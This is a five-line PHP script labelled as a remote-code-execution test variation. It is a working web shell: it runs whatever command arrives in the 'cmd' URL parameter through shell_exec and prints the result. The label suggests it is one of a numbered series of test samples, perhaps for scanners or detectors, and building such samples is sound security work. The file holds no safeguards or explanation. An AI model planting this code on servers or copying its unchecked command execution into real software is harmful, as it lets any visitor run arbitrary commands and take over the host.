<?php
// RCE test variation #135
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>